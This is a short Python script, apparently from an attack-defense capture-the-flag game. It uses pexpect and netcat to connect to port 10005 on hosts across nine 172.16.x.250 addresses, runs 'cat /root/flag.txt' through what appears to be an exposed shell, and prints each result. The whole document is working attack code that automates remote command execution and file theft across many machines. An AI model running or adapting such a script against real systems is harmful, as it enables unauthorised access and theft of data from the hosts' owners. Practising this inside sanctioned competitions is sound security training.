import pexpect
for ip in range(101,110):
  a = pexpect.spawn('nc 172.16.'+str(ip)+'.250 10005')
  a.setecho(False)
  a.sendline('cat /root/flag.txt')
  a.sendline('exit')
  print 'ip:'+str(ip)
  print a.read()
  a.close()
